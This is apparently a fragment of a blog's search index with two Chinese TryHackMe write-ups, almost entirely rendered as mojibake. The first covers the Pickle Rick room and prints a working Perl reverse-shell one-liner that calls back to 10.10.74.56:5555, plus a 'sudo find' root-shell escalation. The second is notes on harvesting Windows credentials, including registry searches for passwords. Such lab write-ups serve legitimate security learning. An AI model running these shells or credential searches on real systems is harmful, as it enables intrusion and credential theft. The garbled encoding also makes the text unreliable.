å¯ä»¥çœ‹åˆ°å¼€å¯äº†ä¸¤ä¸ªç«¯å£ï¼Œæˆ‘ä»¬å…ˆè®¿é—®ä¸€ä¸‹webç«¯å£ å¬è«è’‚â€¦â€¦æˆ‘éœ€è¦ä½ çš„å¸®åŠ©ï¼Œæˆ‘åˆæŠŠè‡ªå·±å˜æˆäº†ä¸€ä¸ªæ³¡èœï¼Œè¿™æ¬¡æˆ‘ä¸èƒ½å†å˜å›å»äº†! æˆ‘éœ€è¦ä½ *BURRRP*....è«è’‚ï¼Œç™»å½•æˆ‘çš„ç”µè„‘ï¼Œæ‰¾åˆ°æœ€åä¸‰ç§ç§˜å¯†æˆåˆ†æ¥å®Œæˆæˆ‘çš„é…¸é»„ç“œåè¯ã€‚å”¯ä¸€çš„é—®é¢˜æ˜¯ï¼Œæˆ‘ä¸çŸ¥é“å¯†ç æ˜¯ä»€ä¹ˆ!æ•‘å‘½ï¼Œè«è’‚ï¼Œæ•‘å‘½! é‚£å°±æ˜¯è¦æ‰¾åˆ°å¯†ç äº†ï¼Œç›´æ¥æ‰«ä¸€æ‰‹ç›®å½• ç›®å½•æ‰«æ ä¸è¿‡åœ¨æ‰«ç›®å½•çš„æ—¶å€™ï¼Œæ‰‹åŠ¨çœ‹äº†çœ‹webç«™ç‚¹ï¼Œå‘ç°æºç è¿˜æœ‰ç”¨æˆ·åï¼šR1ckRul3s è®¿é—®robots.txtå¾—åˆ°ï¼šWubbalubbadubdub â€”â€”çŒœæµ‹è¿™ä¸ªæ˜¯å¯†ç ï¼Œç»“åˆä¸Šé¢çš„ç”¨æˆ·åï¼Œæˆ‘ä»¬è®¿é—®login.phpå°è¯•ç™»å½• å‘ç°ç™»é™†æˆåŠŸï¼Œä¹‹åæ¢ç´¢ä¸€ç•ªå‘ç°åªæœ‰commandså‘½ä»¤é¡µé¢èƒ½è®¿é—®ã€‚å…¶ä»–éƒ½æ— æƒé™ï¼ˆéœ€è¦çœŸæ­£çš„Rickæƒé™ï¼‰ é‚£æˆ‘ä»¬åªèƒ½åœ¨è¿™é‡Œæœé›†ä¸€ä¸‹çœ‹æœ‰æ²¡æœ‰ä¿¡æ¯äº†ï¼Œä½¿ç”¨lsçœ‹åˆ°å«æœ‰ä¸¤ä¸ªå¯ä»¥çš„txtæ–‡ä»¶ å½“æˆ‘ä»¬å°è¯•catè¯»å–æ—¶ï¼Œå‘ç°å‘½ä»¤è¢«ç¦ï¼Œé‚£å°±æ¢å…¶ä»–ï¼Œè¿™é‡Œå¾ˆå¹¸è¿ï¼Œtacè¯»å–å³å¯ï¼šmr. meeseek hair å¾ˆå¹¸è¿ï¼Œè¿™ä¸ªå°±æ˜¯ç¬¬ä¸€ä¸ªåŸæ–™ï¼Œæ¥ä¸‹æ¥è¯»å–clue.txtï¼šè®©æˆ‘ä»¬åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æ‰¾å…¶ä»–ææ–™ï¼ˆæˆåˆ†ï¼‰ è¿™é‡Œæˆ‘æŸ¥çœ‹æ ¹ç›®å½•ï¼Œå‘ç°ä¸€ä¸ªhomeï¼Œè®¤ä¸ºå¾ˆå¯ç–‘ï¼Œå…¶ä¸­å«æœ‰rickï¼Œrickç›®å½•ä¸‹åˆå«æœ‰ å¾ˆå¹¸è¿ï¼Œæ‰¾åˆ°äº†ç¬¬äºŒä¸ªææ–™ï¼Œè¿™é‡Œè¯»å–çš„æ—¶å€™å‘ç°ä»€ä¹ˆç»“æœä¹Ÿæ²¡æœ‰ï¼Œæˆ‘ä»¥ä¸ºåˆæ˜¯å‘½ä»¤è¢«ç¦è¿˜æ˜¯å•¥çš„ï¼Œè¿·èŒ«äº†åŠå¤©ï¼Œç»“æœå°±åœ¨é¡µé¢æºä»£ç å¤„ï¼Œæ˜¯ä¸€æ®µbase64ç¼–ç ï¼Œä¸è¿‡éœ€è¦è§£ç 6ï¼Œ7æ¬¡æ‰okã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼šrabbit hole ä½†ä¸çŸ¥é“è¿™é‡Œæ„å‘³ç€ä»€ä¹ˆï¼Œç„¶åå°±ä¸çŸ¥é“ç¬¬äºŒä¸ªææ–™å’‹æäº†ã€‚ã€‚ã€‚çœ‹äº†wpå‘ç°second ingredientså°±æ˜¯ä¸€ä¸ªæ–‡ä»¶åï¼ˆåªä¸è¿‡ä¸­é—´ç©ºæ ¼åˆ†å¼€äº†ï¼‰è¿™é‡Œè™½ç„¶æƒ³åˆ°è¿‡ï¼Œä½†æ²¡å°è¯•ã€‚ ç›´æ¥tac /home/rick/'second ingredients'ï¼Œå¾—åˆ°ç¬¬äºŒä¸ªææ–™ï¼š1 jerry tear åå¼¹shell è¿™é‡Œçœ‹è¿‡wpå‘ç°éƒ½æ˜¯é‡‡å–äº†åå¼¹shellï¼Œæˆ‘ä»¬ä¹Ÿæä¸€ä¸‹ï¼š è¿™é‡Œå°è¯•äº†åŠå¤©ï¼Œå‘ç°perlå‘½ä»¤å¯ä»¥è¢«æ‰§è¡Œ perl -e 'use Socket;$i=\"10.10.74.56\";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};' æ‹¿åˆ°ä¹‹åï¼Œå¤§æ¦‚ç‡å°±æ˜¯è¯»å–rootç›®å½•äº†ï¼Œä½†å¾ˆæ˜æ˜¾æ²¡æƒé™ï¼Œæƒ³åˆ°ææƒï¼Œçœ‹ä¸€ä¸‹sudo -l è¿™é‡Œæˆ‘å¿˜äº†ALLçš„å«ä¹‰ï¼Œæˆ‘ä¼°æ‘¸ç€å°±æ˜¯å¾ˆå¤šå‘½ä»¤éƒ½èƒ½ç”¨å•¥çš„ï¼Œæˆ‘ç›´æ¥å°è¯•findçš„sudoææƒäº† findææƒ sudo find . -exec /bin/sh \\; -quit è¾“å…¥ä¹‹åä¹Ÿæ˜¯æˆåŠŸææƒ æœ€åä¹Ÿæ˜¯æˆåŠŸæ£€ç´¢åˆ°ç¬¬ä¸‰ä¸ªææ–™ 0x03 æ€»ç»“ è¿™é‡Œå…ˆæ ¹æ®wpçœ‹ä¸€ä¸‹è‡ªå·±åšé¢˜æ€è·¯çš„ä¸è¶³ ä¸Šå›¾ä¸­çš„ cat 'second ingredients' ä¹‹æ‰€ä»¥åŠ å•å¼•å·æ˜¯å› ä¸ºè¯¥åç§°ä¸­é—´å­˜åœ¨ç©ºæ ¼ å¦‚æœä¸åŠ å¼•å· åˆ™åªèƒ½è¯†åˆ«åˆ°secondè€Œä¸æ˜¯second ingredients ä¹Ÿå¯ä»¥å°è¯•ç”¨å…¶ä»–æ–¹å¼å¤„ç†ï¼šsecond\\ ingredientsæˆ–è€…\"second ingredients\" (ALL) NOPASSWD: ALLè¿™ä»£è¡¨å½“å‰ç”¨æˆ·å¯ä»¥ä½¿ç”¨sudoå»æ‰§è¡Œä»»ä½•å‘½ä»¤,è€Œä¸”ä¸éœ€è¦è¾“å…¥å¯†ç  ä¹Ÿå°±æ˜¯è¯´æˆ‘ä¸Šè¿°çš„ææƒï¼Œå°±æ˜¯è‡ªä½œå¤šæƒ…ï¼ˆ-.-ï¼‰ å…³äºlesså‘½ä»¤ï¼šlesså‘½ä»¤ çš„ä½œç”¨ä¸moreååˆ†ç›¸ä¼¼ï¼Œéƒ½å¯ä»¥ç”¨æ¥æµè§ˆæ–‡å­—æ¡£æ¡ˆçš„å†…å®¹ï¼Œä¸åŒçš„æ˜¯lesså‘½ä»¤å…è®¸ç”¨æˆ·å‘å‰æˆ–å‘åæµè§ˆæ–‡ä»¶ï¼Œè€Œmoreå‘½ä»¤åªèƒ½å‘å‰æµè§ˆ å¦å¤–å°±æ˜¯åšé¢˜æ€è·¯äº†ï¼Œå¤§ä½“æ¡†æ¶æœ‰äº†åˆæ­¥å®šå‹ï¼Œå°±æ˜¯å¯¹äºæŸäº›å·¥å…·å‘½ä»¤çš„ä½¿ç”¨çŠ¹è±«ä¸å®šã€‚ æ¯”å¦‚nmapç°åœ¨è¿˜ä¸çŸ¥é“é¢‘ç¹å¾—å»ä½¿ç”¨å“ªä¸€ç§ï¼Œä»Šåå†åšçš„æ—¶å€™å¤šæ³¨æ„æ€»ç»“ä¸€ç•ªã€‚ 0x04 å‚è€ƒæ–‡ç«  ã€THMã€‘Pickle Rick-ç»ƒä¹ ","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"THM-Credentials Harvesting(å‡­æ®æ”¶é›†)","path":"/2024/03/04/thm-ping-ju-shou-ji/","content":"0x01 ç®€ä»‹ æ¬¢è¿æ¥åˆ°å‡­è¯æ”¶é›† è¯¥ä¼šè®®å®¤è®¨è®ºçº¢é˜Ÿæˆå‘˜åˆ©ç”¨è·å¾—çš„å‡­è¯æ‰§è¡Œæ¨ªå‘ç§»åŠ¨å¹¶è®¿é—® AD ç¯å¢ƒä¸­çš„èµ„æºçš„åŸºç¡€çŸ¥è¯†ã€‚æˆ‘ä»¬å°†å±•ç¤ºå¦‚ä½•è·å–ã€é‡ç”¨å’Œæ¨¡æ‹Ÿç”¨æˆ·å‡­æ®ã€‚ å‡­æ®æ”¶é›†åŒ…æ‹¬è·å–ç™»å½•ä¿¡æ¯ã€å¸æˆ·åå’Œå¯†ç ç­‰å‡­æ®çš„æŠ€æœ¯ã€‚å®ƒæ˜¯ä¸€ç§ä»ç³»ç»Ÿä¸­ä¸åŒä½ç½®ï¼ˆä¾‹å¦‚æ˜æ–‡æ–‡ä»¶ã€æ³¨å†Œè¡¨ã€å†…å­˜è½¬å‚¨ç­‰ï¼‰æå–å‡­è¯ä¿¡æ¯çš„æŠ€æœ¯ã€‚ ä½œä¸ºçº¢é˜Ÿæˆå‘˜ï¼Œè·å¾—åˆæ³•å‡­è¯æœ‰ä»¥ä¸‹å¥½å¤„ï¼š å®ƒå¯ä»¥æä¾›å¯¹ç³»ç»Ÿçš„è®¿é—®ï¼ˆæ¨ªå‘ç§»åŠ¨ï¼‰ã€‚ è¿™ä½¿å¾—æˆ‘ä»¬çš„è¡Œä¸ºæ›´éš¾è¢«å‘ç°ã€‚ å®ƒæä¾›äº†åˆ›å»ºå’Œç®¡ç†å¸æˆ·çš„æœºä¼šï¼Œä»¥å¸®åŠ©å®ç°çº¢é˜Ÿå‚ä¸çš„æœ€ç»ˆç›®æ ‡ã€‚ å­¦ä¹ ç›®æ ‡ äº†è§£ä»æœ¬åœ°windowsï¼ˆSAMæ•°æ®åº“ï¼‰æå–å‡­è¯çš„æ–¹æ³• äº†è§£å¦‚ä½•åœ¨æœ¬åœ°å’Œè¿œç¨‹è®¿é—® Windows å†…å­˜å¹¶è½¬å‚¨æ˜æ–‡å¯†ç å’Œèº«ä»½éªŒè¯ç¥¨è¯ã€‚ Windows å‡­æ®ç®¡ç†å™¨ç®€ä»‹ä»¥åŠå¦‚ä½•æå–å‡­æ®ã€‚ äº†è§£æå–åŸŸæ§åˆ¶å™¨å‡­æ®çš„æ–¹æ³• æšä¸¾æœ¬åœ°ç®¡ç†å‘˜å¯†ç è§£å†³æ–¹æ¡ˆ (LAPS) åŠŸèƒ½ã€‚ ä»‹ç»å¯¼è‡´è·å–å‡­æ®çš„ AD æ”»å‡»ã€‚ 0x02 å‡­æ®æ”¶é›†ä»‹ç»å’Œå®éªŒç¯å¢ƒéƒ¨ç½² å‡­è¯æ”¶é›†æ˜¯ä¸€ä¸ªæœ¯è¯­ï¼Œæ˜¯æŒ‡æ”»å‡»è€…å°è¯•è·å–ç”¨äºè®¿é—®ç›®æ ‡ç”¨æˆ·æˆ–è€…ç›®æ ‡ç³»ç»Ÿçš„æœ‰æ•ˆå‡­æ®ï¼Œå®ƒæ˜¯ä¸€ç§æ£€ç´¢æˆ–è€…çªƒå–ç›®æ ‡æœºå™¨ä¸­å·²ç»å­˜å‚¨çš„æœ‰æ•ˆå‡­æ®çš„æŠ€æœ¯ï¼ŒåŒ…æ‹¬é€šè¿‡ç½‘ç»œå—…æ¢æ”»å‡»æ¥æ•æ‰å·²ä¼ è¾“çš„æœ‰æ•ˆå‡­æ®ã€‚ å‡­æ®å¯ä»¥ä»¥å„ç§ä¸åŒçš„å½¢å¼è¢«æˆ‘ä»¬æ‰¾åˆ°ï¼Œä¾‹å¦‚ï¼š å¸æˆ·è¯¦ç»†ä¿¡æ¯(ç”¨æˆ·åå’Œå¯†ç )ã€‚ å¯†ç å“ˆå¸Œå€¼(åŒ…æ‹¬NTLMå“ˆå¸Œç­‰)ã€‚ èº«ä»½éªŒè¯ç¥¨æ®ï¼Œä¾‹å¦‚ç¥¨æ®æˆäºˆç¥¨æ®(TGT)ã€ç¥¨æ®æˆäºˆæœåŠ¡å™¨(TGS)ã€‚ ä»»ä½•æœ‰åŠ©äºæˆ‘ä»¬ç™»å½•ç›®æ ‡ç³»ç»Ÿçš„ä¿¡æ¯(å¦‚ç§é’¥ç­‰) ä¸€èˆ¬æ¥è¯´ï¼Œå‡­æ®æ”¶é›†å¯ä»¥åˆ†ä¸ºä¸¤ç§ç±»å‹ï¼šå¤–éƒ¨å‡­æ®æ”¶é›†ã€å†…éƒ¨å‡­æ®æ”¶é›†ã€‚ å¤–éƒ¨å‡­æ®æ”¶é›†å¯èƒ½æ¶‰åŠç½‘ç»œç”µå­é‚®ä»¶é’“é±¼ç­‰ç›¸å…³æŠ€æœ¯ï¼Œä¸»è¦æ˜¯è¯±å¯¼ç”¨æˆ·è¾“å…¥å…¶æœ‰æ•ˆçš„ç”¨æˆ·åå’Œå¯†ç ï¼›è€Œå†…éƒ¨å‡­æ®æ”¶é›†åˆ™éœ€è¦æ”»å‡»è€…ä½¿ç”¨ä¸åŒçš„æ–¹æ³•æ¥å®ç°ã€‚ æˆ‘ä»¬å°†é‡ç‚¹ä»‹ç»å†…éƒ¨å‡­æ®æ”¶é›†æŠ€æœ¯ï¼Œå‡è®¾æˆ‘ä»¬ä½œä¸ºæ”»å‡»è€…å·²ç»è·å¾—äº†é’ˆå¯¹ç›®æ ‡ADåŸŸçš„åˆå§‹è®¿é—®æƒé™ï¼Œä¸æœ¬æ–‡å®éªŒç›¸å…³çš„ç›®æ ‡ADåŸŸå°†ä¼šæŠŠWindows Server 2019æœºå™¨é…ç½®ä¸ºåŸŸæ§åˆ¶å™¨ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å¯¹åº”çš„Tryhackmeå®éªŒæˆ¿é—´ä¸­éƒ¨ç½²è¯¥ç›®æ ‡æœºå™¨(ä½œä¸ºDC)ã€‚ æˆåŠŸéƒ¨ç½²å¥½ç›®æ ‡æœºå™¨ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ç›´æ¥é€šè¿‡æµè§ˆå™¨è®¿é—®è¯¥æœºå™¨æˆ–è€…ä½¿ç”¨ä»¥ä¸‹å‡­æ®åœ¨æ”»å‡»æœºä¸Šé€šè¿‡RDPæ¥è®¿é—®ç›®æ ‡æœºå™¨ï¼š Machine IP: MACHINE_IP(åœ¨Tryhackmeå®éªŒæˆ¿é—´é¡µé¢ä¸­éƒ¨ç½²ç›®æ ‡æœºå™¨ï¼Œè¿™å°†éšæœºè·å¾—ç›¸å…³çš„ç›®æ ‡IPåœ°å€) Username: thm Password: Passw0rd! ç›®æ ‡åŸŸï¼šTHMæˆ–è€…THM.red 0x03 å‡­æ®è®¿é—® å‡­æ®è®¿é—®æ˜¯æŒ‡æ”»å‡»è€…åœ¨è¢«å…¥ä¾µçš„ç³»ç»Ÿä¸­å‘ç°æœ‰æ•ˆå‡­æ®å¹¶ä¸”è·å¾—å¯¹ç”¨æˆ·å‡­æ®çš„è®¿é—®æƒé™ï¼Œè¿™å¯ä»¥å¸®åŠ©æ”»å‡»è€…é‡ç”¨æœ‰æ•ˆå‡­æ®æˆ–è€…å†’å……æ­£å¸¸ADç”¨æˆ·çš„èº«ä»½ã€‚å‡­æ®è®¿é—®æ˜¯æ”»å‡»è€…è¿›è¡Œå†…ç½‘æ¨ªå‘ç§»åŠ¨å’Œè®¿é—®å…¶ä»–èµ„æº(å¦‚å…¶ä»–åº”ç”¨ç¨‹åºæˆ–ç³»ç»Ÿ)çš„é‡è¦å‰ææ­¥éª¤ã€‚å¯¹äºæ”»å‡»è€…è€Œè¨€ï¼Œå°è¯•è·å–åˆæ³•çš„ç”¨æˆ·å‡­æ®æ¯”ä½¿ç”¨cveæ¥å¯¹ç›®æ ‡ç³»ç»Ÿè¿›è¡Œæ¼æ´åˆ©ç”¨æ›´åŠ å…·æœ‰å¯å–ä¹‹å¤„ã€‚ å…³äºâ€œå‡­æ®è®¿é—®â€çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹MITRE ATT&amp;CKæ¡†æ¶çš„ç›¸å…³éƒ¨åˆ†è¯´æ˜ï¼š https://attack.mitre.org/tactics/TA0006/ ç”¨æˆ·å‡­æ®å¯èƒ½ä¼šè¢«ä¸å®‰å…¨åœ°å­˜å‚¨åœ¨ç›®æ ‡ç³»ç»Ÿä¸­çš„ä¸åŒä½ç½®ï¼š Clear-text filesï¼šæ˜æ–‡æ–‡ä»¶ï¼› Database filesï¼šæ•°æ®åº“æ–‡ä»¶ï¼› Memoryï¼šå†…å­˜ï¼› Password managersï¼šå¯†ç ç®¡ç†å™¨ï¼› Enterprise Vaultsï¼šä¼ä¸šä¿é™©åº“ï¼› Active Directoryï¼šæ´»åŠ¨ç›®å½•ï¼› Network Sniffingï¼šç½‘ç»œå—…æ¢ã€‚ ä»¥æ˜æ–‡æ–‡ä»¶å½¢å¼å­˜å‚¨å‡­æ® æ”»å‡»è€…å¯èƒ½ä¼šåœ¨è¢«å…¥ä¾µçš„æœºå™¨ä¸Šæœç´¢æœ¬åœ°æˆ–è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿä¸­çš„å‡­æ®ï¼Œå› æ­¤è€Œå‘ç°çš„æ˜æ–‡æ–‡ä»¶å¯èƒ½åŒ…å«ç”¨æˆ·æ‰€åˆ›å»ºçš„æ•æ„Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬å¯†ç ã€ç§é’¥ç­‰ã€‚MITRE ATT&amp;CKæ¡†æ¶å°†è¿™ç§å‡­æ®ä¿¡æ¯å®šä¹‰ä¸ºä¸å®‰å…¨å‡­æ®ï¼šæ–‡ä»¶ä¸­çš„å‡­æ®(T1552.001)ã€‚ ä»¥ä¸‹æ˜¯æ”»å‡»è€…å¯èƒ½ä¼šæ„Ÿå…´è¶£çš„å‡ ç§æ˜æ–‡æ–‡ä»¶ç±»å‹ï¼š å…³äºå‘½ä»¤çš„å†å²æ–‡ä»¶ï¼› é…ç½®æ–‡ä»¶(Webåº”ç”¨ç¨‹åºç›¸å…³æ–‡ä»¶ã€FTPæ–‡ä»¶â€¦)ï¼› å…¶ä»–ä¸Windowsåº”ç”¨ç¨‹åº(ç½‘ç»œæµè§ˆå™¨ã€ç”µå­é‚®ä»¶å®¢æˆ·ç«¯ç­‰)ç›¸å…³çš„æ–‡ä»¶ï¼› å¤‡ä»½æ–‡ä»¶ï¼› å…±äº«æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼› æ³¨å†Œè¡¨ï¼› æºä»£ç ã€‚ ä»¥å†å²å‘½ä»¤ä¸ºä¾‹ï¼Œåœ¨ç›®æ ‡ç³»ç»Ÿä¸­å·²ç»æ‰§è¡Œè¿‡çš„PowerShellå‘½ä»¤ä¼šè¢«ä½œä¸ºç”¨æˆ·é…ç½®ä¿å­˜åˆ°å†å²æ–‡ä»¶ä¸­ï¼Œå…·ä½“è·¯å¾„å¦‚ä¸‹ï¼š C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt å¯¹äºæ”»å‡»è€…è€Œè¨€ï¼Œæ£€æŸ¥ç›®æ ‡ç”¨æˆ·æ­£åœ¨åšä»€ä¹ˆæˆ–è€…æŸ¥æ‰¾ä¸ç”¨æˆ·ç›¸å…³çš„æ•æ„Ÿä¿¡æ¯å¯èƒ½æ˜¯å€¼å¾—å°è¯•çš„æ“ä½œã€‚æˆ‘ä»¬å¯ä»¥å°è¯•å¯»æ‰¾æˆ‘ä»¬æ‰€æ„Ÿå…´è¶£çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼Œä¸‹é¢çš„å‘½ä»¤å¯ç”¨äºåœ¨ç›®æ ‡æœºå™¨çš„windowsæ³¨å†Œè¡¨ä¸­æŸ¥æ‰¾â€œpasswordâ€å…³é”®å­—ï¼š c:\\Users\\user&gt; reg query HKLM /f password /t REG_SZ /s #OR C:\\Users\\user&gt; reg query HKCU /f password /t REG_SZ /s ä»¥æ•°æ®åº“æ–‡ä»¶å½¢å¼å­˜å‚¨å‡­æ® åº”ç”¨ç¨‹åºé€šå¸¸ä¼šä½¿ç”¨æ•°æ®åº“æ–‡ä»¶æ¥è¯»å–æˆ–è€…å†™å…¥è®¾ç½®ã€é…ç½®æˆ–å‡­æ®ã€‚åœ¨Windowsæ“ä½œç³»ç»Ÿä¸­ï¼Œæ•°æ®åº“æ–‡ä»¶é€šå¸¸å­˜å‚¨åœ¨æœ¬åœ°ï¼Œè¿™äº›æ–‡ä»¶æ˜¯æˆ‘ä»¬æ£€ç´¢å’ŒæŸ¥æ‰¾å‡­æ®çš„ç»ä½³ç›®æ ‡ã€‚ å…³äºè¿™éƒ¨åˆ†å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥å‚è€ƒä»¥ä¸‹åšå®¢æ–‡ä»¶ï¼Œè¯¥æ–‡ç« çš„å†…å®¹åŒ…å«äº†ä»ç›®æ ‡ç³»ç»Ÿæœ¬åœ°çš„McAfee Endpointæ•°æ®åº“æ–‡ä»¶ä¸­æå–å‡­æ®çš„æ¼”ç¤ºç¤ºä¾‹ã€‚ ã€THMã€‘Breaching Active Directory(å…¥ä¾µæ´»åŠ¨ç›®å½•)-çº¢é˜Ÿ ä½¿ç”¨å¯†ç ç®¡ç†å™¨æ¥å­˜å‚¨å‡­æ® å¯†ç ç®¡ç†å™¨æ˜¯å­˜å‚¨å’Œç®¡ç†ç”¨æˆ·ç”¨äºç™»å½•æœ¬åœ°æœºå™¨å’ŒInternetç½‘ç«™ã€æœåŠ¡çš„å¯†ç ä¿¡æ¯çš„åº”ç”¨ç¨‹åºï¼Œç”±äºå®ƒå¤„ç†çš„æ˜¯ç”¨æˆ·çš„æ•æ„Ÿæ•°æ®ï¼Œå› æ­¤å¯†ç ç®¡ç†å™¨ä¸­çš„æ•°æ®å¿…é¡»è¢«å®‰å…¨åœ°å­˜å‚¨ï¼Œä»¥é˜²æ­¢æ”»å‡»è€…è¿›è¡Œæœªç»æˆæƒçš„è®¿é—®ã€‚ å…³äºå¯†ç ç®¡ç†å™¨åº”ç”¨ç¨‹åºçš„ç¤ºä¾‹å¦‚ä¸‹æ‰€ç¤ºï¼š å†…ç½®å¯†ç ç®¡ç†å™¨(Windows)ï¼› ç¬¬ä¸‰æ–¹å¯†ç ç®¡ç†å™¨ï¼Œå¦‚KeePassã€1Passwordã€LastPassç­‰ã€‚ åœ¨è¿™äº›å¯†ç ç®¡ç†å™¨åº”ç”¨ç¨‹åºä¸­ä¹Ÿå¯èƒ½å­˜åœ¨ä¸€äº›é”™è¯¯é…ç½®å’Œå®‰å…¨æ¼æ´ï¼Œè¿™å°†ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿå°è¯•è®¿é—®å¯†ç ç®¡ç†å™¨ä¸­æ‰€å­˜å‚¨çš„æ•°æ®ã€‚åœ¨ä¿¡æ¯æšä¸¾é˜¶æ®µï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨å„ç§å·¥å…·æ¥è·å–ç›®æ ‡æœºå™¨ä¸Šçš„ç½‘ç»œæµè§ˆå™¨å’Œæ¡Œé¢åº”ç”¨ç¨‹åºæ‰€ä½¿ç”¨çš„å¯†ç ç®¡ç†å™¨åº”ç”¨ç¨‹åºä¸­å·²å­˜å‚¨çš„æ•æ„Ÿæ•°æ®ã€‚ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†è®¨è®ºå¦‚ä½•è®¿é—®Windowså‡­æ®ç®¡ç†å™¨å¹¶å°è¯•æå–å…¶ä¸­æ‰€å­˜å‚¨çš„å¯†ç ä¿¡æ¯ã€‚ é€šè¿‡å†…å­˜è½¬å‚¨è·å–å‡­æ® æ“ä½œç³»ç»Ÿå†…å­˜æ˜¯Windowsæ“ä½œç³»ç»Ÿã€ç”¨æˆ·å’Œå…¶ä»–åº”ç”¨ç¨‹åºæ‰€ç›¸å…³çš„æ•æ„Ÿä¿¡æ¯çš„ä¸°å¯Œæ¥æºã€‚è®¡ç®—æœºæ•°æ®ä¼šåœ¨åº”ç”¨ç¨‹åºè¿è¡Œæ—¶æˆ–æ‰§è¡Œè¿‡ç¨‹ä¸­è¢«åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå› æ­¤ï¼Œåªæœ‰å¯¹ç›®æ ‡ç³»ç»Ÿå…·æœ‰å®Œå…¨æ§åˆ¶æƒé™çš„ç®¡ç†å‘˜ç”¨æˆ·æ‰èƒ½æ‰‹åŠ¨è®¿é—®å†…å­˜ã€‚ ä»¥ä¸‹æ˜¯ä¼šè¢«å­˜å‚¨åœ¨ç›®æ ‡ç³»ç»Ÿå†…å­˜ä¸­çš„æ•æ„Ÿæ•°æ®çš„ä¾‹å­ï¼ŒåŒ…æ‹¬ï¼š æ˜æ–‡å½¢å¼çš„å‡­æ®ï¼› å·²ç»ç¼“å­˜çš„å¯†ç ï¼› ADç¥¨æ®ã€‚ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†è®¨è®ºå¦‚ä½•è®¿é—®ç›®æ ‡ç³»ç»Ÿçš„å†…å­˜å¹¶å°è¯•æå–æ˜æ–‡å¯†ç å’Œç”¨äºèº«ä»½éªŒè¯çš„ç¥¨æ®ã€‚ æ´»åŠ¨ç›®å½•ä¸­çš„å‡­æ® Active Directoryä¼šå­˜å‚¨å¤§é‡ä¸ç”¨æˆ·ã€ç»„ã€è®¡ç®—æœºç­‰ADå¯¹è±¡ç›¸å…³çš„ä¿¡æ¯ã€‚å› æ­¤ï¼Œæšä¸¾ç›®æ ‡Active Directoryç¯å¢ƒæ˜¯çº¢é˜Ÿå®‰å…¨è¯„ä¼°çš„é‡ç‚¹ä¹‹ä¸€ã€‚è™½ç„¶æ´»åŠ¨ç›®å½•(Active Directory)è®¾è®¡çš„å¾ˆå®‰å…¨ï¼Œä½†æ˜¯ç®¡ç†å‘˜çš„ä¸€äº›é”™è¯¯é…ç½®å¯èƒ½ä¼šä½¿Active Directoryå®¹æ˜“é­å—å„ç§æ”»å‡»ã€‚ ä»¥ä¸‹æ˜¯ä¸€äº›å¯èƒ½ä¼šæ³„éœ²ç”¨æˆ·å‡­æ®çš„Active Directoryé”™è¯¯é…ç½®ï¼š ç”¨æˆ·æè¿°ï¼šç®¡ç†å‘˜å¯èƒ½ä¼šåœ¨æ–°ADç”¨æˆ·çš„æè¿°ä¸­è®¾ç½®äº†å¯†ç ï¼Œå¹¶å°†å¯†ç ä¿¡æ¯ç•™åœ¨ç”¨æˆ·æè¿°å±æ€§ä¸­ï¼Œè¿™å°±ä½¿å¾—è¯¥å¸æˆ·å®¹æ˜“è¢«æ”»å‡»è€…è¿›è¡Œæœªç»æˆæƒçš„è®¿é—®ã€‚ ç»„ç­–ç•¥SYSVOLï¼šé€šè¿‡å¯¹å­˜åœ¨æ¼æ´çš„SYSVOLè¿›è¡Œåˆ©ç”¨ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨å·²æ³„éœ²çš„åŠ å¯†å¯†é’¥æ¥è®¿é—®ç®¡ç†å‘˜å¸æˆ·ã€‚(è¿™éƒ¨åˆ†å†…å®¹å°†åœ¨ä¸‹æ–‡ä¸­å…·ä½“ä»‹ç») NTDSï¼šè¿™æ˜¯ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä¼šåŒ…å«ADç”¨æˆ·çš„å‡­æ®ä¿¡æ¯ï¼Œå› æ­¤å®ƒæ˜¯æ”»å‡»è€…çš„ç›®æ ‡ä¹‹ä¸€ã€‚ å¯¼è‡´ADæ”»å‡»çš„å…¶ä»–é…ç½®ï¼šé”™è¯¯çš„ADé…ç½®ä¼šä½¿å¾—ç›¸å…³çš„ADç¯å¢ƒå®¹æ˜“å—åˆ°å„ç§ADæ”»å‡»ï¼Œä»è€Œé€ æˆç”¨æˆ·å‡­æ®æ³„éœ²ã€‚ é€šè¿‡ç½‘ç»œå—…æ¢è·å–å‡­æ® åœ¨è·å¾—ç›®æ ‡ç½‘ç»œçš„åˆå§‹è®¿é—®æƒé™ä¹‹åï¼Œæ”»å‡»è€…å¯ä»¥å¯¹æœ¬åœ°è®¡ç®—æœº(åŒ…æ‹¬ADç¯å¢ƒ)è¿›è¡Œå„ç§ç½‘ç»œæ”»å‡»ï¼Œå…¶ä¸­é’ˆå¯¹ç½‘ç»œåè®®çš„ä¸­é—´äººæ”»å‡»å…è®¸æ”»å‡»è€…åœ¨ç›®æ ‡ç½‘ç»œç¯å¢ƒä¸­åˆ›å»ºæ¶æ„æˆ–æ¬ºéª—æ€§çš„èµ„æºï¼Œä»¥çªƒå–ç›®æ ‡ç½‘ç»œä¸­çš„èº«ä»½éªŒè¯ä¿¡æ¯ï¼Œå¦‚NTLMå¯†ç å“ˆå¸Œå€¼ç­‰ã€‚ reg query HKLM /f flag /t 